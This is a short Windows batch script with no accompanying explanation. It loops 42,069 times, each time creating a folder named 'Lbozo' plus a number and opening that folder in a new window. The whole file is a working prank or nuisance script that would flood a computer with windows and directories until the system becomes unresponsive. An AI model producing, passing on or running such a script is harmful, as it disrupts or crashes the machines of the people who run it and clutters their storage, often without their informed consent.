@echo off
set /A repeats=0
:createdirif
if not %repeats% == 42069 goto createdir
goto end
:createdir
md Lbozo%repeats%
start Lbozo%repeats%
set /A repeats=%repeats%+1
goto createdirif
:end
pause